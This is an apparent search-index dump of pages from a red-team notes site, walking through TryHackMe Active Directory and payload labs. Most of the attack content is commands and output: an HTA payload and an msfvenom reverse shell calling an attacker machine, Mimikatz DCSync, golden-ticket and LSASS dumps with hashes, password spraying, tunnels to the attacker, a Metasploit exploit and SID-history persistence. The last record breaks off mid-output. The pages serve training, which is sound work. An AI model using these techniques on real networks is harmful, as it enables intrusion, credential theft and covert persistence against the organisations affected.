    "u": "https://fire.tymyrddin.dev/docs/opsec/countermeasures",
    "t": "Apply appropriate countermeasures ",
    "c": "Apply appropriate countermeasures  https://tryhackme.com/room/opsec Countermeasures are designed to prevent an adversary from detecting critical information, provide an alternative interpretation of critical information or indicators (deception), or deny the adversary’s collection system. Example: The countermeasure for the vulnerability of running Nmap, using the Metasploit framework, and hosting the phishing pages using the same public IP address, seems obvious: Use a different IP address for each activity. Example: For the vulnerability of an unsecured database used to store data received from a phishing page, ensure that the database is adequately secured so that the data cannot be accessed except by authorised people.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6448f39a7686387f1559b561f8f65794",
    "u": "https://fire.tymyrddin.dev/docs/weapons/hta",
    "t": "HTML Application (HTA) ",
    "c": "HTML Application (HTA)  Use an ActiveXObject to execute cmd.exe (save as payload.hta): <html> <body> <script> var c= 'cmd.exe' new ActiveXObject('WScript.Shell').Run(c); </script> </body> </html> Serve the payload python3 -m http.server 8000 Visit the page from the target machine http://IP-ATTACK-MACHINE:8000/payload.hta and run it Reverse shell  Create a reverse shell with msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP-ATTACK-MACHINE LPORT=443 -f hta-psh -o thm.hta Set up a listener on the attack machine: nc -nlvp 443 The reverse shell is launched when the link is visited from the target machine. You can also generate and serve HTA with Metasploit use exploit/windows/misc/hta_server and set LHOST, LPORT, SRVHOST, and payload windows/meterpreter/reverse_tcp . When the link is visited in the target we get a meterpreter shell.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cb40493b1fc002ca3e0627ad1a0f26f8",
    "u": "https://ad.tymyrddin.dev/",
    "t": "Mythical blue lake ",
    "c": "Mythical blue lake  If an organisation’s grove uses Microsoft Windows, you are almost guaranteed to find AD. Microsoft AD is the dominant suite used to manage Windows domain networks. And because AD is used for Identity and Access Management of the entire grove, it holds the keys to the kingdom, making it a very likely target for attackers. Breaching Introduction NTLM authenticated services LDAP bind credentials Authentication relays Microsoft Deployment Toolkit Configuration files Enumerating Introduction Setup for THM AD Credential injection Through Microsoft Management Console Through Command Prompt Through PowerShell Through Bloodhound Cleanup Lateral movement and pivoting Introduction Setup for THM AD Moving through the network Spawning processes remotely Moving laterally using wmi Use of alternate authentication material Abusing user behaviour Port forwarding Cleanup Exploiting Introduction Setup for THM AD Exploiting permission delegation Exploiting kerberos delegation Exploiting automated relays Exploiting AD users Exploiting GPOs Exploiting certificates Exploiting domain trusts Persisting Introduction Setup for THM AD Persistence through credentials Persistence through tickets Persistence through certificates Persistence through SID history Persistence through group membership Persistence through ACLs Persistence through GPOs Credentials harvesting Introduction Credential access Local Windows credentials Local Security Authority Subsystem Service Windows Credential Manager Domain Controller Local Administrator Password Solution Hashes and tickets",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e170918ced25ac2b6d28a47dd4fa9de1",
    "u": "https://ad.tymyrddin.dev/docs/exploit/trusts",
    "t": "Exploiting domain trusts ",
    "c": "Exploiting domain trusts  A forest, in Active Directory terms, consists of domain trees. Trusts define how domains in a forest can talk to one another. The main types of trusts are: Directional: Trust flows from one domain to another trusted domain Transitive: Trust flows between multiple trusted domains KRBTGT and Golden tickets  If an attacker compromises a domain controller and achieves full SYSTEM rights, it is possible to extract the hash of the krbtgt account. This would allow the attacker to create TGS tickets for any resources they choose. In order to create golden tickets, the following must be known: FQDN of the domain SID of the domain Username to impersonate KRBTGT hash The first three are usually easy to recover. The last one requires a domain compromise since the KRBTGT password hash is only stored on domain controllers. Dumping the KRBTGT hash  Use the RDP session on THMSERVER2 to recover the KRBTGT password hash using Mimikatz with DC Sync: C:\\Tools>mimikatz_trunk\\x64\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # lsadump::dcsync /user:za\\krbtgt [DC] 'za.tryhackme.loc' will be the domain [DC] 'THMDC.za.tryhackme.loc' will be the DC server [DC] 'za\\krbtgt' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : krbtgt ** SAM ACCOUNT ** SAM Username : krbtgt Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) Account expiration : Password last change : 4/25/2022 7:18:22 PM Object Security ID : S-1-5-21-3885271727-2693558621-2658995185-502 Object Relative ID : 502 Credentials: Hash NTLM: removed ntlm- 0: removed lm - 0: removed ... Getting the SIDs  Recover two SIDs: The SID of the child domain controller (THMDC), to be impersonated in the forged TGT The SID of the Enterprise Admins in the parent domain, to be added as an extra SID to the forged TGT Use the AD-RSAT Powershell cmdlets to recover the SID of the child domain controller: PS C:\\> Get-ADComputer -Identity \"THMDC\" DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc DNSHostName : THMDC.za.tryhackme.loc Enabled : True Name : THMDC ObjectClass : computer ObjectGUID : bd651750-782b-4b09-93b4-b5987ec7311b SamAccountName : THMDC$ SID : S-1-5-21-3885271727-2693558621-2658995185-1001 UserPrincipalName : Recover the SID of the Enterprise Admins group by querying the parent domain controller: PS C:\\> Get-ADGroup -Identity \"Enterprise Admins\" -Server thmrootdc.tryhackme.loc DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc GroupCategory : Security GroupScope : Universal Name : Enterprise Admins ObjectClass : group ObjectGUID : a23ae384-16e8-44d5-9b36-8173c4e0e5de SamAccountName : Enterprise Admins SID : S-1-5-21-3330634377-removed-519 Exploiting domain trusts  Use Mimikatz to generate a golden ticket. mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt Try browsing the remote file system of \\\\thmrootdc.tryhackme.loc\\C$ (the UNC path to the C$ share). The flag is on THMROOTDC in the Administrator’s Desktop folder (flag6.txt).",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e4796a5afc251170f2357a3f4765e025",
    "u": "https://ad.tymyrddin.dev/docs/breach/ntlm",
    "t": "NTLM authenticated services ",
    "c": "NTLM authenticated services  New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users’ identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is used by the services on a network. And some services that use NetNTLM may also be exposed to the internet. Examples: Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal. Remote Desktop Protocol (RDP) service of a server being exposed to the internet. Exposed VPN endpoints that were integrated with AD. Web applications that are internet-facing and make use of NetNTLM. The user is now either granted access or denied access, authorisation is performed on the Exchange server with consultation of the msg.target.com Domain Controller. NTLM is generally considered insecure because it uses outdated cryptography that is vulnerable to several modes of attacks. NTLM is also vulnerable to pass-the-hash and brute-force attacks. Password spraying  Most AD environments have account lockout configured, we won’t be able to run a full brute-force attack. Instead, a password spraying attack might work. We could use tools such as Hydra to assist with the password spraying attack. The room uses a script named ntlm_passwordspray.py . The core function takes a suggested password and a URL to target as input and attempts to authenticate to the URL with each username in the textfile. By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not. If the credential pair is valid, the application responds with a 200 HTTP (OK) code. If the pair is invalid, the application returns a 401 HTTP (Unauthorised) code. The parameters: userfile - Textfile containing usernames ( usernames.txt ) fqdn - Fully qualified domain name associated with the organisation we are attacking ( za.tryhackme.com ) password - The password we want to use for our spraying attack ( Changeme123 ) attackurl - The URL of the application that supports Windows Authentication ( http://ntlmauth.za.tryhackme.com ) python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ Results: [*] Starting passwords spray attack using the following password: Changeme123 [-] Failed login with Username: anthony.reynolds [-] Failed login with Username: samantha.thompson [-] Failed login with Username: dawn.turner [-] Failed login with Username: frances.chapman [-] Failed login with Username: henry.taylor [-] Failed login with Username: jennifer.wood [+] Valid credential pair found! Username: hollie.powell Password: Changeme123 [-] Failed login with Username: louise.talbot [+] Valid credential pair found! Username: heather.smith Password: Changeme123 [-] Failed login with Username: dominic.elliott [+] Valid credential pair found! Username: gordon.stevens Password: Changeme123 [-] Failed login with Username: alan.jones [-] Failed login with Username: frank.fletcher [-] Failed login with Username: maria.sheppard [-] Failed login with Username: sophie.blackburn [-] Failed login with Username: dawn.hughes [-] Failed login with Username: henry.black [-] Failed login with Username: joanne.davies [-] Failed login with Username: mark.oconnor [+] Valid credential pair found! Username: georgina.edwards Password: Changeme123 [*] Password spray attack completed, 4 valid credential pairs found",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cdac4106d9f5f787b82699230879a026",
    "u": "https://ad.tymyrddin.dev/docs/pivot/portforward",
    "t": "Port forwarding ",
    "c": "Port forwarding  SSH tunnelling  SSH, as it already has built-in functionality to do port forwarding through a feature called SSH Tunneling. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system. On Windows machines, most likely no SSH server will be available: Start a tunnel from the compromised machine, acting as an ssh client, to the attack machine, which will act as an ssh server. Making a connection back to our attacker’s machine, we will want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels. useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser The SSH tunnel can be used to do either local or remote port forwarding. SSH remote port forwarding  Remote port forwarding is useful, for example, when having gained control over the 2.2.2.2 Windows host (it does not need to be administrator access) and would like to use it as a pivot to access a port on a server to which we can not directly connect. Take a reachable port from the SSH client (the compromised machine) and project it into a remote ssh server (the attacker's machine). To forward port 3389 on the server back to our attacker’s machine, on the compromised Windows host: C:\\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N This establishes an SSH session from 2.2.2.2 (Compromised host) to 1.1.1.1 (Attacker machine) using the tunneluser user. Because the tunneluser is not allowed to run a shell on the attacker machine, we need to run the ssh command with the -N switch to prevent the client from requesting one, or the connection will exit immediately. The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the ssh server ( 3389 ), followed by a colon and then the IP and port of the socket we will be forwarding ( 3.3.3.3:3389 ). Port numbers do not need to match. When up and running, we can go to the attacker’s machine and RDP into the forwarded port to reach the server: xfreerdp /v:127.0.0.1 /u:<username> /p:<password> SSH local port forwarding  Local port forwarding allows for “pulling” a port from an ssh server into the ssh client. Any host on the network that can not connect directly to the attacker machine but can connect to the compromised host will now be able to reach the services offered on the attack machine through the pivot host. Take any service available in our attacker's machine and make it available through a port on the compromised host. To forward port 80 from the attack machine and make it available from the compromised host, run: C:\\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N The -L option requires indicating which local socket used by the compromised host to receive connections on ( *:80 ) and the remote socket to connect to from the attack machine perspective ( 127.0.0.1:80 ). Opening a new port on the compromised host, add a firewall rule to allow for incoming connections (with dir=in ). This requires administrative privileges: netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80 Up and running, any user pointing their browsers to the compromised host at http://2.2.2.2:80 will see the website published by the attack machine. Port forwarding with socat  socat is not as flexible as ssh , and it is more noisy, but if ssh is not available on the compromised host, may be an option. It must be transferred to the compromised host first. Access port 3389 on the server using the compromised host as a pivot, with a similar effect as SSH remote port forwarding. To access port 3389 on the server using the compromised host: C:\\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 The fork option forks a new process for each connection received, making multiple connections without closing possible. Otherwise, it would be closed after the first connection finishes. And because a port is being opened on the pivot host, create a firewall rule: netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 The compromised host will spawn port 80 and listen for connections to be forwarded to port 80 on the attack machine. To expose port 80 from the attack machine, making it reachable by the server: C:\\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 Dynamic port forwarding and SOCKS  When wanting to run scans against many ports of a host, or even many ports across many machines through a pivot host, dynamic port forwarding seems a good choice. It allows for pivoting through a host and establishing several connections to any IP addresses/ports we want, by using a SOCKS proxy. Establish a reverse dynamic port forwarding ssh tunnel on the compromised host: C:\\> ssh tunneluser@1.1.1.1 -R 9050 -N Edit the proxychains configuration on the attack machine: sudo nano /etc/proxychains4.conf Go down to the [ProxyList] section and add your proxy connection. The default port is 9050 , but any port will work as long as it matches the one we used when establishing the SSH tunnel. If we now want to execute any command through the proxy, we can use proxychains , for example: proxychains curl http://pxeboot.za.tryhackme.com Note: nmap might not work well with SOCKS in some circumstances Flags  Connect to THMJMP2 via SSH using the credentials from the first task. Connect via RDP to THMIIS using socat . Exploit vulnerable Rejetto HFS on the Domain Controller. RDP to THMIIS  With the credentials from the distributor, ssh into the jumphost: ssh username@za.tryhackme.com@thmjmp2@za.tryhackme.com On the jumphost, run socat: C:\\tools\\socat\\>socat TCP4-LISTEN:50000,fork TCP4:THMIIS.za.tryhackme.com:3389 The firewall is disabled. Set up a listener on port 50000 on the attack machine, and connect to THMIIS via RDP from the attack machine by pivoting through the listener at THMJMP2: xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020 Flag is on desktop of t1_thomas.moore. Exploit Rejetto HFS on the Domain Controller  Use local port forwarding by adding -L *:6666:127.0.0.1:6666 and -L *:7777:127.0.0.1:7777 to the ssh command on the jumphost THMJMP2. This will bind both ports on THMJMP2 and tunnel any connection back to the attack machine: C:\\> ssh tunneluser@<IP attack machine> -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N Start Metasploit and configure the exploit so that the required ports match the ports forwarded through THMJMP2: msfconsole msf6 > use rejetto_hfs_exec msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7777 msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666 msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888 msf6 exploit(windows/http/rejetto_hfs_exec) > exploit Receive a shell back at the attack machine. The flag is on C:\\hfs\\flag.txt . Resources  0xBEN Notes and Cheatsheets: Port Forwarding 0xBEN Notes and Cheatsheets: Forward Dynamic SOCKS Proxy 0xBEN Notes and Cheatsheets: Reverse Dynamic SOCKS Proxy",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2414018cab62f7e8da7ba6aa0d70c580",
    "u": "https://ad.tymyrddin.dev/docs/enum/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Enumerating Active Directory What?  Enumerate details about the AD setup and structure with authenticated access, even super low-privileged access. Why?  Finding some way to escalate privileges or move laterally to gain additional access until we have enough privileges to execute and reach our goals. How?  Setup for THM AD Credential injection Through Microsoft Management Console Through Command Prompt Through PowerShell Through Bloodhound Cleanup",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ae1a619508b4c6367ab7faba85ccf1a8",
    "u": "https://ad.tymyrddin.dev/docs/harvest/lsass",
    "t": "Local Security Authority Subsystem Service ",
    "c": "Local Security Authority Subsystem Service  Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects. Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. If we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as “OS Credential Dumping: LSASS Memory (T1003)”. To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select “Create dump file”. An alternative way to dump a process if a GUI is not available to us is by using ProcDump . ProcDump is a Sysinternals process dump utility that runs from the command prompt. Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information and requires administrator and system privileges in order to dump memory and extract credentials. Protected LSASS and Mimikatz  To disable LSASS protection: C:\\Tools\\Mimikatz> mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::logonpasswords ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) mimikatz # !+ [*] 'mimidrv' service not present [+] 'mimidrv' service successfully registered [+] 'mimidrv' service ACL to everyone [+] 'mimidrv' service started mimikatz # !processprotect /process:lsass.exe /remove Process : lsass.exe PID 528 -> 00/00 [0-0-0] Again  mimikatz # sekurlsa::logonpasswords Authentication Id : 0 ; 515377 (00000000:0007dd31) Session : RemoteInteractive from 3 User Name : Administrator Domain : THM Logon Server : CREDS-HARVESTIN Logon Time : 6/3/2022 8:30:44 AM SID : S-1-5-21-1966530601-3185510712-10604624-500 msv : [00000003] Primary * Username : Administrator * Domain : THM * NTLM : 98d3a787a80d08385cea7fb4aa2a4261 * SHA1 : 64a137cb8178b7700e6cffa387f4240043192e72 * DPAPI : bc355c6ce366fdd4fd91b54260f9cf70 ...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a82925250dbf251bd4693ae0180a8c69",
    "u": "https://ad.tymyrddin.dev/docs/persist/sid",
    "t": "Persistence through SID history ",
    "c": "Persistence through SID history  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. This one is: Not easily removed except by RSAT tooling Difficult to find, not easily detected The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. In the new domain, the user would have a new SID, but we can add the user’s existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence. One way to abuse this feature is to add the SID of a privileged group – like the Domain Admins group – to the SID history of a low-level user. Even though the user is not a member of the group in AD, the system will authorise them as if they were due to the group SID being in their history. SSH into the domain controller using the given administrator credentials: ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Inspect the SID history and group membership of the unprivileged account from the credential distributor . powershell -ep bypass Get-ADUser 'user.name' -Properties sidhistory,memberof The SIDHistory property is an empty list {} and the MemberOf property shows that this user is only a member of the Internet Access group. Get the SID of the Domain Admins group. Get-ADGroup 'Domain Admins' Use the DSInternals PowerShell module to add the Domain Admins SID to the user’s SID history : Import-Moduls DSInternals Can not modify the SID history while the NTDS database is running: Stop-Service ntds -Force Add the SID to the low privilege account’s SID history: Add-ADDBSidHistory -SamAccountName 'donald.ross' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath 'C:\\Windows\\NTDS\\ntds.dit' Restart the NTDS database: Start-Service ntds SSH to thmwrk1 to test the new privileges: ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Check access to a privileged resource on the domain controller: dir \\\\thmdc.za.tryhackme.loc\\c$\\Users Resources  Sneaky Active Directory Persistence #14: SID History",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e912f5aa6ea7450fcfda1b9a76b9826d",
    "u": "https://ad.tymyrddin.dev/docs/exploit/permissions",
    "t": "Exploiting permission delegation ",
    "c": "Exploiting permission delegation  Exploiting ACEs  Access Control Entries (ACEs) populate Discretionary Access Control Lists (DACLs). These ACLs determine the permissions that certain AD objects have over others. Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that any other AD object has against the target object. Certain ACEs can be very dangerous if misconfigured: ForceChangePassword: Set a user’s password without knowing their current password. AddMembers: Add users (including oneself), groups, or computers to a target group. GenericAll: Complete control over an object, including the ability to change the user’s password, register an SPN or add an AD object to the target group. GenericWrite: Update any non-protected parameters of our target object. For example, could update the scriptPath parameter, which would set a user’s logon script. WriteOwner: Update the owner of the target object. Could make ourselves the owner, allowing us to gain additional permissions over the object. WriteDACL: We have the ability to write new ACEs to the target object’s DACL. For example, could write an ACE that grants our account full control over the target object. AllExtendedRights: Perform any action associated with extended AD rights against the target object. For example, the ability to force change a user’s password. Bloodhound  Sharphound has already been executed. The data is in the .zip task file. Launch neo4j and bloodhound and import the data. sudo neo4j console sudo bloodhound --no-sandbox Drag the .zip file into the Bloodhound window. Search for our initial account retrieved from http://distributor.za.tryhackme.loc/creds Privilege Escalation  Look at the info in the Node Info tab, it is pretty obvious that the initial access user does not have many privileges. We have the ability to RDP into THMWRK1, but this will only provide us with low-privileged access. Compromise the Tier 2 Admins group (administrative privileges on all workstations). Ask Bloodhound if there is perhaps a road that we can follow to compromise this group (Add your user account as the start position and the Tier 2 Admins group as the end position). An administrator has misconfigured the Permission Delegation of the IT Support group by providing the Domain Users group with the AddMembers ACE. This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group. Furthermore, Bloodhound shows that the IT Support Group has the ForceChangePassword ACE for the Tier 2 Admins group members. This is not really a misconfiguration since Tier 2 admins are not that sensitive, but it provides a very potent attack path when combined with the initial misconfiguration. Add your user account as the start position and the Tier 2 Admins group as the end position. Right-click GenericWrite and choose Help to read more information about the privilege escalation path. Add AD account to the IT Support group  RDP to thmwrk1.za.tryhackme.loc and open a PowerShell terminal. xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'max.smith' /p:'<given password>' Use the Add-ADGroupMember PowerShell cmdlet from the AD-RSAT toolset. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\max.smith> $user = Get-ADUser -Identity 'max.smith' PS C:\\Users\\max.smith> $group = Get-ADGroup -Identity 'IT Support' PS C:\\Users\\max.smith> Add-ADGroupMember -Identity $group -Members $user PS C:\\Users\\max.smith> Get-ADGroupMember -Identity $group ... distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : max.smith objectClass : user objectGUID : f0cd5ecd-6a42-4eff-8015-071e1dc3747b SamAccountName : max.smith SID : S-1-5-21-3885271727-2693558621-2658995185-1142 ... Force a new password on a T2 Admin  PS C:\\Users\\max.smith> Get-ADGroupMember -Identity \"Tier 2 Admins\" Pick one close to the bottom, or randomly. $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force PS C:\\Users\\max.smith> $t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1 PS C:\\Users\\max.smith> $t2admin.Name t2_caroline.dawson PS C:\\Users\\max.smith> Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password Set-ADAccountPassword : Access is denied At line:1 char:1 + Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $passwor ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (CN=t2_caroline....ryhackme,DC=loc:ADAccount) [Set-ADAccountPassword], UnauthorizedAccessException + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.Manag ement.Commands.SetADAccountPassword Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate the SSH or RDP session, take a quick break, and then reauthenticate and try again. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\max.smith> $t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1 PS C:\\Users\\max.smith> $t2admin.Name t2_alan.riley PS C:\\Users\\max.smith> $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force PS C:\\Users\\max.smith> Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password PS C:\\Users\\max.smith> Authenticate to THMWRK1 using this target account with its new password. You currently have administrative access to this workstation. The flag is on the Desktop of the Administrator user on THMWRK1 (flag1.txt).",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "3a51ff16b6f1a42b01e919e7f33c1b95",
    "u": "https://ad.tymyrddin.dev/docs/harvest/wcm",
    "t": "Windows Credential Manager ",
    "c": "Windows Credential Manager  Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories: Web credentials contain authentication details stored in Internet browsers or other applications. Windows credentials contain Windows authentication details, such as NTLM or Kerberos. Generic credentials contain basic authentication details, such as clear-text usernames and passwords. Certificate-based credentials: Authenticated details based on certifications. Note that authentication details are stored on the user’s folder and are not shared among Windows user accounts. And, they are cached in memory. Listing the Available Credentials from the Credentials Manager: C:\\Users\\Administrator>VaultCmd /list To check for any stored credentials in the Web Credentials vault: C:\\Users\\Administrator>VaultCmd /listproperties:\"Web Credentials\" To list more information about the stored credentials: C:\\Users\\Administrator>VaultCmd /listcreds:\"Web Credentials\" Credential Dumping  The VaultCmd is not able to show the password. Use Get-WebCredentials.ps1 : C:\\Users\\Administrator>powershell -ex bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Administrator> Import-Module C:\\Tools\\Get-WebCredentials.ps1 PS C:\\Users\\Administrator> Get-WebCredentials UserName Resource Password Properties -------- -------- -------- ---------- THMUser internal-app.thm.red E4syPassw0rd {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]} RunAs  C:\\Users\\thm>runas /savecred /user:THM.red\\thm-local cmd.exe Mimikatz  To dump clear-text passwords stored in the Credential Manager from memory: C:\\Users\\Administrator>c:\\Tools\\Mimikatz\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::credman",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8d164da348c0fe841a76a0885999a933",
    "u": "https://ad.tymyrddin.dev/docs/exploit/kerberos",
    "t": "Exploiting kerberos delegation ",
    "c": "Exploiting kerberos delegation  The general purpose of Kerberos delegation is to allow an application or service to access a resource on another machine on behalf of a user or machine. If a user logs into an application, the application will request resources on other machines on behalf of the user. It removes the need for a global service account with less granular permissions. Unconstrained Delegation  With Unconstrained Delegation, a host has no limit on the resources it can access on behalf of a user who connects, as long as the user has the TRUSTED_FOR_DELEGATION flag set. Once a user connects, the host requests a TGT for the user and caches it locally for future use. Given the TGT, an attacker could proceed to access any resource accessible by the user owner of the TGT. For example, if an Administrator logged on to the host with unconstrained delegation, the attacker would now be in possession of the Administrator’s TGT. Constrained Delegation  Constrained Delegation restricts the type of services a service acount can request on behalf of a user. For example, if a domain service account (sevice principal) was running a web application on a web server, constrained delegation would enable the administrator to choose which services to delegate access to on behalf of another user. An administrator could selectively filter delegation to resources such as HTTP, CIFS, LDAP, HOST, MSSQL, etc. If an attacker compromised a host configured for constrained delegation and obtained the NTLM hash or password of the service account, the attacker could request a TGT for the service account and use the TGT to request a TGS for the delegate account to access a particular service. Resource-Based Constrained Delegation  This model of delegation works inversely from the other delegation types. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. For example, if we have permission to configure RBCD for a service, we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service. Lab: Constrained Delegation Exploitation  Using the tier 2 admin credentials gained in the permissions exploitation , RDP to THMWRK1 as T2 Admin for some enumeration and exploitation. Enumeration  Use PowerView and the Get-NetUser cmdlet of PowerSploit for this enumeration. PowerView is going to almost always get detected by antivirus! Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\t2_alan.riley> Import-Module C:\\tools\\PowerView.ps1 PS C:\\Users\\t2_alan.riley> Get-NetUser -TrustedToAuth logoncount : 43 